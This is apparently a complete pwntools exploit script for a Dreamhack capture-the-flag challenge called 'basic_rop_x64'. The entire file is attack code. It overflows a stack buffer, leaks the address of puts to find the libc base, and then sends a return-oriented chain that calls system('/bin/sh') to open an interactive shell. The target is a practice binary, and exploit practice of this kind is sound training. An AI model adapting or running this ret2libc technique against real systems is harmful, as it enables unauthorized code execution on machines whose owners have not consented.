from pwn import *

context.log_level = 'debug'
p = process("./basic_rop_x64")
#p = remote("host3.dreamhack.games", 11273)
libc = ELF("./libc.so.6")
e = ELF("./basic_rop_x64")

ret = 0x4005a9
pop_rdi = 0x400883

puts_plt = e.plt['puts']
puts_got = e.got['puts']

payload = b"A"*0x48
payload += p64(ret)

# puts(puts_got)
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(e.sym['main'])

p.send(payload)

p.recvuntil(b"A"*0x40)
puts = u64(p.recvn(6)+b"\x00"*2)

libc_base = puts - libc.sym['puts']
system = libc_base + libc.sym['system']
sh = libc_base + list(libc.search(b'/bin/sh'))[0]

print(hex(sh))

payload = b"A"*0x48
payload += p64(pop_rdi)
payload += p64(sh)
payload += p64(system)

p.send(payload)
p.interactive()
